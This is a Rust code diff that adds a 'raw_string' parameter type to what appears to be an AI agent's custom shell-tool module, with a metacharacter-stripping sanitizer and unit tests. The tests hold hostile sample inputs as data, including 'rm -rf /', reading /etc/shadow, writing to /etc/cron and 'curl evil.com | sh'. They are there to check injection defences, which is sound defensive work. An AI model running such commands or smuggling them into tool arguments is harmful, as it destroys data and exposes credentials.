@@ -27,12 +27,72 @@ fn shell_escape(value: &str) -> String {
     format!("'{}'", value.replace('\'', "'\\''"))
 }
 
-/// Interpolate `{{key}}` placeholders in a command template with shell-escaped values.
-fn interpolate(template: &str, args: &HashMap<String, String>) -> String {
+/// Sanitize a raw_string value: allow word-splitting but strip shell metacharacters.
+///
+/// `raw_string` is intended for multi-arg CLI input (e.g. `gmail +triage --max 5`),
+/// not for arbitrary shell expansion. This strips characters that enable injection
+/// (`;`, `|`, `$()`, backticks, etc.) while preserving normal flag/argument characters.
+fn sanitize_raw_string(value: &str) -> String {
+    let sanitized: String = value
+        .chars()
+        .filter(|c| {
+            !matches!(
+                c,
+                ';' | '|'
+                    | '&'
+                    | '$'
+                    | '`'
+                    | '('
+                    | ')'
+                    | '{'
+                    | '}'
+                    | '<'
+                    | '>'
+                    | '!'
+                    | '\\'
+                    | '"'
+                    | '\''
+                    | '#'
+                    | '~'
+            )
+        })
+        .collect();
+    if sanitized.len() != value.len() {
+        tracing::warn!(
+            original_len = value.len(),
+            sanitized_len = sanitized.len(),
+            "Stripped shell metacharacters from raw_string parameter"
+        );
+    }
+    sanitized
+}
+
+/// Interpolate `{{key}}` placeholders in a command template.
+///
+/// Parameters with type `"raw_string"` are inserted without shell escaping,
+/// allowing the shell to word-split them into multiple arguments. This is
+/// useful for CLI wrappers where `{{args}}` should expand to multiple flags
+/// (e.g. `gws {{args}}` → `gws gmail +triage --max 5`).
+///
+/// All other parameter types are shell-escaped to prevent command injection.
+fn interpolate(
+    template: &str,
+    args: &HashMap<String, String>,
+    param_types: Option<&HashMap<String, String>>,
+) -> String {
     let mut result = template.to_string();
     for (key, value) in args {
         let placeholder = format!("{{{{{}}}}}", key);
-        result = result.replace(&placeholder, &shell_escape(value));
+        let is_raw = param_types
+            .and_then(|p| p.get(key))
+            .map(|t| t == "raw_string")
+            .unwrap_or(false);
+        let replacement = if is_raw {
+            sanitize_raw_string(value)
+        } else {
+            shell_escape(value)
+        };
+        result = result.replace(&placeholder, &replacement);
     }
     result
 }
@@ -87,7 +147,13 @@ impl Tool for CustomTool {
                 let mut properties = serde_json::Map::new();
                 let mut required = Vec::new();
                 for (name, type_str) in params {
-                    properties.insert(name.clone(), json!({"type": type_str}));
+                    // Normalize raw_string to string for the LLM schema
+                    let schema_type = if type_str == "raw_string" {
+                        "string"
+                    } else {
+                        type_str.as_str()
+                    };
+                    properties.insert(name.clone(), json!({"type": schema_type}));
                     required.push(json!(name));
                 }
                 json!({
@@ -116,7 +182,11 @@ impl Tool for CustomTool {
         };
 
         // Interpolate command template
-        let command = interpolate(&self.def.command, &string_args);
+        let command = interpolate(
+            &self.def.command,
+            &string_args,
+            self.def.parameters.as_ref(),
+        );
 
         // Validate against shell security blocklist (cached config, no regex recompilation)
         if let Err(e) = self.security.validate_command(&command) {
@@ -242,16 +312,97 @@ mod tests {
     fn test_interpolate_basic() {
         let mut args = HashMap::new();
         args.insert("name".to_string(), "world".to_string());
-        let result = interpolate("echo {{name}}", &args);
+        let result = interpolate("echo {{name}}", &args, None);
         assert_eq!(result, "echo 'world'");
     }
 
     #[test]
     fn test_interpolate_missing_param() {
         let args = HashMap::new();
-        let result = interpolate("echo {{name}}", &args);
+        let result = interpolate("echo {{name}}", &args, None);
         // Missing params are left as-is
         assert_eq!(result, "echo {{name}}");
+    }
+
+    #[test]
+    fn test_interpolate_raw_string() {
+        let mut args = HashMap::new();
+        args.insert("args".to_string(), "gmail +triage --max 5".to_string());
+        let mut param_types = HashMap::new();
+        param_types.insert("args".to_string(), "raw_string".to_string());
+        let result = interpolate("gws {{args}}", &args, Some(&param_types));
+        // raw_string should NOT be shell-escaped
+        assert_eq!(result, "gws gmail +triage --max 5");
+    }
+
+    #[test]
+    fn test_sanitize_raw_string_preserves_normal_args() {
+        assert_eq!(
+            sanitize_raw_string("gmail +triage --max 5"),
+            "gmail +triage --max 5"
+        );
+        assert_eq!(
+            sanitize_raw_string("-v --output /tmp/out.txt"),
+            "-v --output /tmp/out.txt"
+        );
+        assert_eq!(
+            sanitize_raw_string("key=value,foo=bar"),
+            "key=value,foo=bar"
+        );
+    }
+
+    #[test]
+    fn test_sanitize_raw_string_strips_injection() {
+        // Semicolon chaining
+        assert_eq!(sanitize_raw_string("foo; rm -rf /"), "foo rm -rf /");
+        // Command substitution
+        assert_eq!(sanitize_raw_string("$(cat /etc/shadow)"), "cat /etc/shadow");
+        // Backticks
+        assert_eq!(sanitize_raw_string("`whoami`"), "whoami");
+        // Pipes
+        assert_eq!(sanitize_raw_string("foo | sh"), "foo  sh");
+        // Background execution
+        assert_eq!(sanitize_raw_string("sleep 999 &"), "sleep 999 ");
+        // Redirections
+        assert_eq!(
+            sanitize_raw_string("echo pwned > /etc/cron"),
+            "echo pwned  /etc/cron"
+        );
+    }
+
+    #[test]
+    fn test_interpolate_raw_string_sanitized() {
+        let mut args = HashMap::new();
+        args.insert("args".to_string(), "gmail; curl evil.com | sh".to_string());
+        let mut param_types = HashMap::new();
+        param_types.insert("args".to_string(), "raw_string".to_string());
+        let result = interpolate("gws {{args}}", &args, Some(&param_types));
+        // Metacharacters stripped, only safe chars remain
+        assert_eq!(result, "gws gmail curl evil.com  sh");
+    }
+
+    #[test]
+    fn test_interpolate_mixed_raw_and_escaped() {
+        let mut args = HashMap::new();
+        args.insert("args".to_string(), "gmail +send".to_string());
+        args.insert("body".to_string(), "hello world".to_string());
+        let mut param_types = HashMap::new();
+        param_types.insert("args".to_string(), "raw_string".to_string());
+        param_types.insert("body".to_string(), "string".to_string());
+        let result = interpolate("gws {{args}} --body {{body}}", &args, Some(&param_types));
+        assert_eq!(result, "gws gmail +send --body 'hello world'");
+    }
+
+    #[test]
+    fn test_parameters_raw_string_exposed_as_string() {
+        let mut def = simple_def("test", "gws {{args}}");
+        let mut params = HashMap::new();
+        params.insert("args".to_string(), "raw_string".to_string());
+        def.parameters = Some(params);
+        let tool = CustomTool::new(def);
+        let schema = tool.parameters();
+        // LLM should see "string", not "raw_string"
+        assert_eq!(schema["properties"]["args"]["type"], "string");
     }
 
     #[test]
